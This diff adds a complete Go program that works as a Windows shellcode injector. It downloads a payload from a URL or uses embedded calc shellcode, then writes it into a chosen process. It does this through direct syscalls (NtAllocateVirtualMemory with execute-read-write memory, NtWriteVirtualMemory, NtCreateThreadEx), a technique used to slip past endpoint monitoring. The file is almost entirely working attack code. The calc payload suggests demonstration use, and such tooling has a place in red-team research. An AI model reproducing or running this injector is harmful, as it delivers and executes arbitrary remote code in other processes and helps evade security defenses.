@@ -1,0 +1,391 @@
+package main
+
+import (
+	"bufio"
+	"flag"
+	"fmt"
+	"io"
+	"net/http"
+	"os"
+	"sort"
+	"strconv"
+	"strings"
+	"unsafe"
+
+	winapi "github.com/carved4/go-direct-syscall"
+
+	"golang.org/x/sys/windows"
+)
+
+// getEmbeddedShellcode returns the embedded calc shellcode as bytes
+func getEmbeddedShellcode() []byte {
+	// TODO: Paste hex bytes here
+	hexString := "505152535657556A605A6863616C6354594883EC2865488B32488B7618488B761048AD488B30488B7E3003573C8B5C17288B741F204801FE8B541F240FB72C178D5202AD813C0757696E4575EF8B741F1C4801FE8B34AE4801F799FFD74883C4305D5F5E5B5A5958C3"
+	
+	// Convert hex string to bytes
+	bytes := make([]byte, len(hexString)/2)
+	for i := 0; i < len(hexString); i += 2 {
+		b, _ := strconv.ParseUint(hexString[i:i+2], 16, 8)
+		bytes[i/2] = byte(b)
+	}
+	return bytes
+}
+
+// Windows constants that might not be defined in windows package
+const (
+	PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
+	STILL_ACTIVE                      = 259 // STILL_ACTIVE constant
+)
+
+// Process information structure
+type ProcessInfo struct {
+	Pid  uint32
+	Name string
+}
+
+// downloadPayload downloads shellcode from a URL
+func downloadPayload(url string) ([]byte, error) {
+	// Create HTTP client with reasonable timeout
+	client := &http.Client{
+		Timeout: 30 * 1000000000, // 30 seconds
+	}
+	
+	// Make the request
+	resp, err := client.Get(url)
+	if err != nil {
+		return nil, fmt.Errorf("failed to download payload: %v", err)
+	}
+	defer resp.Body.Close()
+	
+	// Check response code
+	if resp.StatusCode != http.StatusOK {
+		return nil, fmt.Errorf("unexpected status code: %d", resp.StatusCode)
+	}
+	
+	// Read the payload
+	payload, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, fmt.Errorf("failed to read payload: %v", err)
+	}
+	
+	fmt.Printf("Downloaded %d bytes of shellcode\n", len(payload))
+	return payload, nil
+}
+
+// getProcessList retrieves a list of running processes
+func getProcessList() ([]ProcessInfo, error) {
+	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
+	if err != nil {
+		return nil, fmt.Errorf("failed to create process snapshot: %v", err)
+	}
+	defer windows.CloseHandle(snapshot)
+
+	var entry windows.ProcessEntry32
+	entry.Size = uint32(unsafe.Sizeof(entry))
+
+	err = windows.Process32First(snapshot, &entry)
+	if err != nil {
+		return nil, fmt.Errorf("Process32First failed: %v", err)
+	}
+
+	var processes []ProcessInfo
+	for {
+		exeFile := windows.UTF16ToString(entry.ExeFile[:])
+		
+		// Skip system processes with empty names
+		if exeFile != "" {
+			// Check if we can access this process
+			handle, err := windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, entry.ProcessID)
+			if err == nil {
+				// We can access this process
+				windows.CloseHandle(handle)
+				processes = append(processes, ProcessInfo{
+					Pid:  entry.ProcessID,
+					Name: exeFile,
+				})
+			}
+		}
+
+		err = windows.Process32Next(snapshot, &entry)
+		if err != nil {
+			break
+		}
+	}
+
+	// Sort processes by name for easier readability
+	sort.Slice(processes, func(i, j int) bool {
+		return processes[i].Name < processes[j].Name
+	})
+
+	return processes, nil
+}
+
+func isProcessRunning(pid uint32) error {
+	process, err := windows.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, false, pid)
+	if err != nil {
+		return fmt.Errorf("failed to open process for verification: %v", err)
+	}
+	defer windows.CloseHandle(process)
+
+	var exitCode uint32
+	err = windows.GetExitCodeProcess(process, &exitCode)
+	if err != nil {
+		return fmt.Errorf("failed to get process exit code: %v", err)
+	}
+
+	if exitCode != STILL_ACTIVE {
+		return fmt.Errorf("target process is not running")
+	}
+
+	return nil
+}
+
+func directSyscallInjector(payload []byte, pid uint32) error {
+	if len(payload) == 0 {
+		return fmt.Errorf("payload is empty")
+	}
+
+	// Verify process is running
+	if err := isProcessRunning(pid); err != nil {
+		return err
+	}
+
+	// Open target process
+	process, err := windows.OpenProcess(winapi.PROCESS_ALL_ACCESS, false, pid)
+	if err != nil {
+		return fmt.Errorf("failed to open target process: %v", err)
+	}
+	defer windows.CloseHandle(process)
+
+	// NtAllocateVirtualMemory using direct syscall library
+	var remoteBuffer uintptr
+	allocSize := uintptr(len(payload))
+	
+	status, err := winapi.NtAllocateVirtualMemory(
+		uintptr(process),
+		&remoteBuffer,
+		0,
+		&allocSize,
+		winapi.MEM_COMMIT|winapi.MEM_RESERVE,
+		winapi.PAGE_EXECUTE_READWRITE,
+	)
+
+	if err != nil {
+		return fmt.Errorf("NtAllocateVirtualMemory error: %v", err)
+	}
+
+	if status != winapi.STATUS_SUCCESS {
+		return fmt.Errorf("NtAllocateVirtualMemory failed: %#x", status)
+	}
+
+	fmt.Printf("Allocated memory at %#x, status: %#x\n", remoteBuffer, status)
+
+	// NtWriteVirtualMemory using direct syscall library
+	var bytesWritten uintptr
+	
+	status, err = winapi.NtWriteVirtualMemory(
+		uintptr(process),
+		remoteBuffer,
+		unsafe.Pointer(&payload[0]),
+		uintptr(len(payload)),
+		&bytesWritten,
+	)
+
+	if err != nil {
+		return fmt.Errorf("NtWriteVirtualMemory error: %v", err)
+	}
+
+	if status != winapi.STATUS_SUCCESS {
+		return fmt.Errorf("NtWriteVirtualMemory failed: %#x", status)
+	}
+
+	if bytesWritten != uintptr(len(payload)) {
+		return fmt.Errorf("incomplete write: %d bytes written, expected %d", bytesWritten, len(payload))
+	}
+
+	fmt.Printf("Wrote %d bytes, status: %#x\n", bytesWritten, status)
+
+	// NtCreateThreadEx using direct syscall library
+	var hThread uintptr
+	
+	// NtCreateThreadEx requires ALL 11 parameters - Windows expects them all
+	status, err = winapi.NtCreateThreadEx(
+		&hThread,             // 1. ThreadHandle
+		winapi.THREAD_ALL_ACCESS, // 2. DesiredAccess  
+		0,                    // 3. ObjectAttributes (NULL)
+		uintptr(process),     // 4. ProcessHandle
+		remoteBuffer,         // 5. StartRoutine
+		0,                    // 6. Argument (NULL)
+		0,                    // 7. CreateFlags
+		0,                    // 8. ZeroBits  
+		0,                    // 9. StackSize
+		0,                    // 10. MaximumStackSize
+		0,                    // 11. AttributeList (NULL)
+	)
+
+	if err != nil {
+		return fmt.Errorf("NtCreateThreadEx error: %v", err)
+	}
+
+	if status != winapi.STATUS_SUCCESS {
+		return fmt.Errorf("NtCreateThreadEx failed: %#x", status)
+	}
+
+	fmt.Printf("Created thread: %#x\n", status)
+
+	if hThread != 0 {
+		windows.CloseHandle(windows.Handle(hThread))
+	}
+
+	return nil
+}
+
+func main() {
+	// Hash initialization - precompute hashes for common API calls
+	winapi.GetFunctionHash("ntdll.dll")
+	winapi.GetFunctionHash("NtAllocateVirtualMemory")
+	winapi.GetFunctionHash("NtWriteVirtualMemory")
+	winapi.GetFunctionHash("NtCreateThreadEx")
+	
+	// Parse command line flags
+	urlFlag := flag.String("url", "", "URL to download shellcode from")
+	exampleFlag := flag.Bool("example", false, "Execute embedded calc shellcode")
+	flag.Parse()
+
+	var payload []byte
+	var err error
+
+	// Check if example flag is used
+	if *exampleFlag {
+		// Embedded calc shellcode
+		payload = getEmbeddedShellcode()
+		fmt.Printf("Using embedded calc shellcode (%d bytes)\n", len(payload))
+	} else {
+		// Check if URL is provided
+		url := *urlFlag
+		if url == "" {
+			fmt.Println("Error: You must specify either -url or -example flag")
+			fmt.Println("Usage:")
+			fmt.Println("  ./cmd.exe -url http://example.com/payload.bin")
+			fmt.Println("  ./cmd.exe -example")
+			os.Exit(1)
+		}
+		
+		// Download the payload
+		payload, err = downloadPayload(url)
+		if err != nil {
+			fmt.Printf("Failed to download payload: %v\n", err)
+			return
+		}
+	}
+	
+	// Get list of accessible processes
+	processes, err := getProcessList()
+	if err != nil {
+		fmt.Printf("Failed to get process list: %v\n", err)
+		return
+	}
+	
+	if len(processes) == 0 {
+		fmt.Println("No accessible processes found")
+		return
+	}
+	
+	var selectedProcess ProcessInfo
+	
+	if *exampleFlag {
+		// Auto-select a safe process for example mode
+		safeProcesses := []string{"notepad.exe", "calc.exe", "mspaint.exe", "wordpad.exe", "write.exe"}
+		
+		// First try to find a known safe process
+		found := false
+		for _, safeProc := range safeProcesses {
+			for _, proc := range processes {
+				if strings.EqualFold(proc.Name, safeProc) {
+					selectedProcess = proc
+					found = true
+					fmt.Printf("Auto-selected safe process: %s (PID: %d)\n", proc.Name, proc.Pid)
+					break
+				}
+			}
+			if found {
+				break
+			}
+		}
+		
+		// If no known safe process found, use the first non-system process
+		if !found {
+			// Skip common system processes
+			systemProcesses := []string{"system", "smss.exe", "csrss.exe", "wininit.exe", "winlogon.exe", 
+				"services.exe", "lsass.exe", "svchost.exe", "dwm.exe", "explorer.exe"}
+			
+			for _, proc := range processes {
+				isSystem := false
+				for _, sysProc := range systemProcesses {
+					if strings.EqualFold(proc.Name, sysProc) {
+						isSystem = true
+						break
+					}
+				}
+				if !isSystem {
+					selectedProcess = proc
+					found = true
+					fmt.Printf("Auto-selected process: %s (PID: %d)\n", proc.Name, proc.Pid)
+					break
+				}
+			}
+		}
+		
+		if !found {
+			fmt.Println("No suitable safe process found for auto-injection")
+			return
+		}
+	} else {
+		// Display process list for manual selection when using URL
+		fmt.Println("\nAvailable processes:")
+		fmt.Println("-------------------")
+		for i, proc := range processes {
+			fmt.Printf("[%d] PID: %d - %s\n", i+1, proc.Pid, proc.Name)
+		}
+		
+		// Prompt user to select a process
+		var selectedIndex int
+		for {
+			fmt.Print("\nEnter process number to inject into: ")
+			scanner := bufio.NewScanner(os.Stdin)
+			if scanner.Scan() {
+				input := strings.TrimSpace(scanner.Text())
+				
+				// Parse the input
+				index, err := strconv.Atoi(input)
+				if err != nil || index < 1 || index > len(processes) {
+					fmt.Printf("Invalid selection. Please enter a number between 1 and %d\n", len(processes))
+					continue
+				}
+				
+				selectedIndex = index - 1
+				break
+			}
+			
+			if err := scanner.Err(); err != nil {
+				fmt.Printf("Error reading input: %v\n", err)
+				return
+			}
+		}
+		
+		// Get the selected process
+		selectedProcess = processes[selectedIndex]
+		fmt.Printf("\nSelected: [%d] %s (PID: %d)\n", selectedIndex+1, selectedProcess.Name, selectedProcess.Pid)
+	}
+
+	
+	// Perform the injection
+	fmt.Printf("Injecting payload into %s (PID: %d)\n", selectedProcess.Name, selectedProcess.Pid)
+	err = directSyscallInjector(payload, selectedProcess.Pid)
+	
+	if err != nil {
+		fmt.Printf("Injection failed: %v\n", err)
+	} else {
+		fmt.Println("Injection Successful")
+	}
+}
